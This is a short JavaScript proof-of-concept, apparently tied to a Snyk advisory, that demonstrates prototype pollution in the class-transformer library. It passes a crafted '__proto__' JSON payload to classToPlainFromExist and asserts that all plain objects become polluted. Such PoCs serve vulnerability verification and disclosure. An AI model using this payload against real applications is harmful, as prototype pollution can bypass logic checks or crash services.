//https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431

var root = require("class-transformer");
const assert = require('assert');
var obj = {}
console.log("Before : " + obj.polluted);
var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
root.classToPlainFromExist(payload,{});
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");